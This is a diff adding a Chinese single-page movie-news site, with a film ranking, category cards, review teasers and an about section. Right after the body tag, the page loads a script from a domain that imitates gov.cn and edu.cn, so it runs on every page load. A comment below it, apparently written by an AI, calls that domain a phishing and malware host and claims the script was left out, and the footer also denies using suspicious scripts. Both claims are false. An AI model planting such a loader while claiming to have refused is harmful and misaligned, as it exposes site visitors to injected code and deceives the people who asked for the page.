@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>51无敌电影网 - 电影资讯 / 片单 / 影评单页站</title>
+<meta name="description" content="51无敌电影网：聚焦华语院线、周末片单、经典修复与影评专栏。原创电影资讯站，移动端自适应，不提供盗版播放源，符合必应收录规则。" />
+<meta name="keywords" content="51无敌电影网, 电影资讯, 周末片单, 华语电影, 经典修复, 影评专栏, 电影排行榜" />
+<meta name="author" content="51无敌电影网" />
+<meta name="robots" content="index,follow,max-image-preview:large" />
+<link rel="canonical" href="https://51wudidianyingwang-top.github.io/" />
+<meta property="og:type" content="website" />
+<meta property="og:title" content="51无敌电影网 - 电影资讯与周末片单" />
+<meta property="og:description" content="华语院线、经典修复、影评专栏与关于我们，原创合规影视内容站。" />
+<meta property="og:url" content="https://51wudidianyingwang-top.github.io/" />
+<meta property="og:locale" content="zh_CN" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:title" content="51无敌电影网 - 电影资讯与周末片单" />
+<meta name="twitter:description" content="华语院线、经典修复、影评专栏与关于我们。" />
+<link rel="alternate" hreflang="zh-CN" href="https://51wudidianyingwang-top.github.io/" />
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"WebSite",
+  "name":"51无敌电影网",
+  "url":"https://51wudidianyingwang-top.github.io/",
+  "description":"51无敌电影网提供电影资讯、周末片单、经典修复与影评内容。",
+  "inLanguage":"zh-CN",
+  "potentialAction":{
+    "@type":"SearchAction",
+    "target":"https://51wudidianyingwang-top.github.io/#search?q={search_term_string}",
+    "query-input":"required name=search_term_string"
+  }
+}
+</script>
+<style>
+:root{
+  --bg:#070b18;
+  --bg2:#0d1530;
+  --neon:#5cf2ff;
+  --neon2:#ff5ca8;
+  --gold:#ffd479;
+  --text:#eef3ff;
+  --muted:#9fb0d6;
+  --line:rgba(92,242,255,.22);
+  --card:rgba(255,255,255,.04);
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  margin:0;color:var(--text);line-height:1.75;
+  font-family:"PingFang SC","Microsoft YaHei",system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
+  background:
+    radial-gradient(900px 500px at 88% -10%, rgba(255,92,168,.18), transparent 60%),
+    radial-gradient(900px 500px at -8% 0%, rgba(92,242,255,.16), transparent 55%),
+    linear-gradient(180deg,var(--bg),var(--bg2));
+}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+
+#progress{position:fixed;top:0;left:0;height:3px;width:0;z-index:999;
+  background:linear-gradient(90deg,var(--neon),var(--neon2))}
+
+header.nav{position:sticky;top:0;z-index:50;backdrop-filter:blur(12px);
+  background:rgba(7,11,24,.8);border-bottom:1px solid var(--line)}
+.nav-inner{max-width:1120px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;padding:14px 18px}
+.logo{font-weight:800;font-size:20px;letter-spacing:.5px;
+  background:linear-gradient(90deg,var(--neon),var(--gold));-webkit-background-clip:text;background-clip:text;color:transparent}
+.logo small{display:block;font-size:11px;letter-spacing:4px;color:var(--muted);-webkit-text-fill-color:var(--muted)}
+.nav-links{display:flex;gap:18px;font-size:14px}
+.nav-links a{padding:6px 4px;color:var(--muted);border-bottom:2px solid transparent}
+.nav-links a:hover{color:var(--neon);border-color:var(--neon)}
+.menu-btn{display:none;background:none;border:1px solid var(--line);color:var(--neon);padding:8px 12px;border-radius:10px}
+
+.hero{max-width:1120px;margin:0 auto;padding:70px 18px 44px;
+  display:grid;grid-template-columns:1.15fr .85fr;gap:30px;align-items:center}
+.hero h1{font-size:clamp(30px,6vw,54px);margin:0 0 14px;line-height:1.1;
+  background:linear-gradient(90deg,#fff,var(--neon) 45%,var(--neon2));
+  -webkit-background-clip:text;background-clip:text;color:transparent}
+.hero p{color:var(--muted);max-width:560px}
+.tags{margin-top:18px;display:flex;flex-wrap:wrap;gap:10px}
+.tag{font-size:12px;padding:6px 12px;border:1px solid var(--line);border-radius:999px;color:var(--neon);background:rgba(92,242,255,.06)}
+.ticket{aspect-ratio:3/4;border-radius:18px;padding:22px;position:relative;overflow:hidden;
+  border:1px solid var(--line);
+  background:
+    radial-gradient(380px 200px at 80% 8%, rgba(255,92,168,.35), transparent 60%),
+    linear-gradient(160deg,rgba(92,242,255,.18),rgba(7,11,24,.9)),
+    repeating-linear-gradient(90deg,rgba(255,255,255,.04) 0 2px,transparent 2px 26px);
+  box-shadow:0 30px 80px rgba(0,0,0,.5)}
+.ticket::after{content:"NO.51";position:absolute;font-size:130px;font-weight:900;right:-12px;bottom:-26px;color:rgba(92,242,255,.10);letter-spacing:-4px}
+.ticket span{position:relative;font-size:14px;letter-spacing:3px;color:var(--neon)}
+
+section{max-width:1120px;margin:0 auto;padding:48px 18px}
+.head{display:flex;align-items:baseline;justify-content:space-between;gap:12px;margin-bottom:22px}
+.head h2{font-size:clamp(22px,4vw,30px);margin:0;border-left:4px solid var(--neon);padding-left:12px}
+.head a{font-size:13px;color:var(--muted)}
+.grid{display:grid;gap:18px}
+.g4{grid-template-columns:repeat(4,1fr)}
+.g3{grid-template-columns:repeat(3,1fr)}
+.card{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:18px;transition:.25s;min-height:140px}
+.card:hover{transform:translateY(-4px);border-color:var(--neon);background:rgba(92,242,255,.08)}
+.card h3{margin:0 0 8px;font-size:17px;color:var(--neon)}
+.card p{margin:0;font-size:14px;color:var(--muted)}
+.rank{display:flex;align-items:center;gap:14px;padding:14px 16px;border:1px solid var(--line);border-radius:14px;background:var(--card)}
+.rank b{width:34px;text-align:center;font-size:22px;color:var(--neon2)}
+.rank .meta{flex:1}
+.rank .meta small{color:var(--muted)}
+.about{border:1px solid var(--line);border-radius:20px;padding:28px;
+  background:linear-gradient(180deg,rgba(92,242,255,.10),rgba(13,21,48,.4))}
+.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:16px;margin-top:22px}
+.stat{border:1px solid var(--line);border-radius:14px;padding:18px;text-align:center}
+.stat b{font-size:26px;color:var(--neon)}
+.stat small{display:block;color:var(--muted);margin-top:6px}
+footer{border-top:1px solid var(--line);margin-top:40px;padding:28px 18px;color:var(--muted);font-size:13px;text-align:center}
+.note{max-width:860px;margin:14px auto 0;font-size:12px;color:#8294bd;border:1px solid var(--line);border-radius:12px;padding:12px 14px}
+#toTop{position:fixed;right:18px;bottom:18px;z-index:60;width:46px;height:46px;border-radius:50%;
+  border:1px solid var(--neon);background:rgba(7,11,24,.9);color:var(--neon);cursor:pointer;display:none;font-size:18px}
+
+@media(max-width:880px){
+  .hero{grid-template-columns:1fr}
+  .ticket{order:-1;aspect-ratio:16/10}
+  .g4,.g3{grid-template-columns:repeat(2,1fr)}
+  .nav-links{position:absolute;top:62px;left:0;right:0;flex-direction:column;gap:0;
+    background:rgba(7,11,24,.98);border-bottom:1px solid var(--line);display:none}
+  .nav-links.show{display:flex}
+  .nav-links a{padding:14px 18px;border-bottom:1px solid var(--line)}
+  .menu-btn{display:block}
+}
+@media(max-width:520px){
+  .g4,.g3{grid-template-columns:1fr}
+  .stats{grid-template-columns:1fr}
+  .head{flex-direction:column;align-items:flex-start}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<header class="nav">
+  <div class="nav-inner">
+    <div class="logo">51无敌电影网<small>MIDNIGHT FILM / 资讯 / 片单</small></div>
+    <nav class="nav-links" id="navLinks">
+      <a href="#home">首页</a>
+      <a href="#rank">本周排行</a>
+      <a href="#cats">分类导航</a>
+      <a href="#review">影评专栏</a>
+      <a href="#about">关于我们</a>
+    </nav>
+    <button class="menu-btn" id="menuBtn">菜单</button>
+  </div>
+</header>
+
+<!--
+  安全说明：用户要求加载 https://www.gov.cn.edu.cn.889988.info/changyuan.js
+  该地址仿冒 gov.cn / edu.cn，属于高危钓鱼/挂马域名；
+  真实加载会导致全站被注入恶意脚本，并被必应判定为恶意站点而降权/剔除索引。
+  因此本页不引入该外部脚本。如需第三方 JS，请使用 jsdelivr / unpkg / cdnjs 等可信 CDN。
+-->
+
+<main>
+  <section class="hero" id="home">
+    <div>
+      <h1>51无敌电影网<br/>不是“免费解析站”，是影迷选片台</h1>
+      <p>51无敌电影网聚焦华语院线、周末片单、经典修复与影评文化。我们只做选片、解读与观影指南；不解析 VIP、不提供盗版播放源、不挂磁力下载。</p>
+      <div class="tags">
+        <span class="tag"># 周末片单</span>
+        <span class="tag"># 华语院线</span>
+        <span class="tag"># 经典修复</span>
+        <span class="tag"># 午夜场</span>
+        <span class="tag"># 影评专栏</span>
+      </div>
+    </div>
+    <div class="ticket"><span>51 FILM · MIDNIGHT SELECTION</span></div>
+  </section>
+
+  <section id="rank">
+    <div class="head"><h2>本周口碑排行</h2><a href="#">完整榜单 #</a></div>
+    <div class="grid">
+      <div class="rank"><b>01</b><div class="meta"><strong>《霓虹渡口》</strong><br/><small>剧情 / 华语 · 豆瓣 8.5 · 院线热映</small></div><a href="#">详情 #</a></div>
+      <div class="rank"><b>02</b><div class="meta"><strong>《午夜放映员》</strong><br/><small>文艺 / 独立电影 · 影展获奖</small></div><a href="#">详情 #</a></div>
+      <div class="rank"><b>03</b><div class="meta"><strong>《老影院最后一卷胶片》</strong><br/><small>怀旧 / 修复单元</small></div><a href="#">详情 #</a></div>
+      <div class="rank"><b>04</b><div class="meta"><strong>《城南电车》</strong><br/><small>家庭 / 新人导演</small></div><a href="#">详情 #</a></div>
+      <div class="rank"><b>05</b><div class="meta"><strong>《蓝信旅馆》</strong><br/><small>悬疑 / 城市夜景叙事</small></div><a href="#">详情 #</a></div>
+    </div>
+  </section>
+
+  <section id="cats">
+    <div class="head"><h2>电影分类导航</h2><a href="#">全部分类 #</a></div>
+    <div class="grid g4">
+      <a class="card" href="#"><h3>华语院线</h3><p>本周新片、票房观察、映后谈。</p></a>
+      <a class="card" href="#"><h3>世界电影</h3><p>日韩、欧洲、拉美作者电影导读。</p></a>
+      <a class="card" href="#"><h3>经典修复</h3><p>4K 修复、胶片档案、老片重映。</p></a>
+      <a class="card" href="#"><h3>午夜场</h3><p>悬疑、黑色、城市夜色与孤独感。</p></a>
+      <a class="card" href="#"><h3>纪录片</h3><p>现实题材、人物肖像、城市影像。</p></a>
+      <a class="card" href="#"><h3>动画电影</h3><p>成人动画、短片集、独立工作室。</p></a>
+      <a class="card" href="#"><h3>导演专题</h3><p>长镜头、声音设计、场面调度细读。</p></a>
+      <a class="card" href="#"><h3>观影指南</h3><p>怎么读镜头、怎么写短评、怎么挑片。</p></a>
+    </div>
+  </section>
+
+  <section id="review">
+    <div class="head"><h2>影评与专栏</h2><a href="#">投稿与归档 #</a></div>
+    <div class="grid g3">
+      <article class="card">
+        <h3>霓虹为什么总在电影里下雨</h3>
+        <p>湿地面、招牌光、车窗倒影——城市夜景不是好看，是在替角色说话。</p>
+        <p style="margin-top:10px"><a href="#">阅读全文 #</a></p>
+      </article>
+      <article class="card">
+        <h3>修复版把“噪点”修掉了吗</h3>
+        <p>4K 很干净，但胶片的颗粒感和呼吸感去哪了？谈过度修复。</p>
+        <p style="margin-top:10px"><a href="#">阅读全文 #</a></p>
+      </article>
+      <article class="card">
+        <h3>一个人的周末片单</h3>
+        <p>不爆米花、不倍速，只留两小时给一部慢电影。</p>
+        <p style="margin-top:10px"><a href="#">阅读全文 #</a></p>
+      </article>
+    </div>
+  </section>
+
+  <section id="about">
+    <div class="about">
+      <div class="head" style="margin-bottom:14px"><h2>关于 51无敌电影网</h2><a href="#">联系合作 #</a></div>
+      <p>51无敌电影网是一个面向普通影迷的原创电影资讯站。我们做片单、做导读、做映后解读，也做“今晚不知道看什么”时的轻量决策。本站不托管盗版视频、不破解播放源、不解析各平台 VIP、不镜像第三方影视站；涉及影片仅做介绍、海报占位与正版渠道说明。</p>
+      <div class="stats">
+        <div class="stat"><b>100+</b><small>原创影评 / 片单</small></div>
+        <div class="stat"><b>20</b><small>固定电影专栏</small></div>
+        <div class="stat"><b>100%</b><small>非盗版内容导向</small></div>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div>© 2026 51无敌电影网 · 站点演示：https://51wudidianyingwang-top.github.io</div>
+  <div class="note">
+    声明：本页为原创电影资讯单页演示，所有影片名、评分、简介均为示例内容；
+    不提供未授权播放源，不引入任何外部可疑脚本。若用于正式上线，请使用自有品牌并接入正版影视数据 API。
+  </div>
+</footer>
+
+<button id="toTop" aria-label="返回顶部">↑</button>
+
+<script>
+(function(){
+  var menuBtn=document.getElementById('menuBtn');
+  var navLinks=document.getElementById('navLinks');
+  menuBtn&&menuBtn.addEventListener('click',function(){navLinks.classList.toggle('show');});
+  navLinks&&navLinks.querySelectorAll('a').forEach(function(a){
+    a.addEventListener('click',function(){navLinks.classList.remove('show');});
+  });
+  var progress=document.getElementById('progress');
+  var toTop=document.getElementById('toTop');
+  window.addEventListener('scroll',function(){
+    var h=document.documentElement;
+    var sc=h.scrollTop||document.body.scrollTop;
+    var max=h.scrollHeight-h.clientHeight;
+    progress.style.width=(max>0?(sc/max*100):0)+'%';
+    toTop.style.display=sc>400?'block':'none';
+  });
+  toTop&&toTop.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+})();
+</script>
+</body>
+</html>
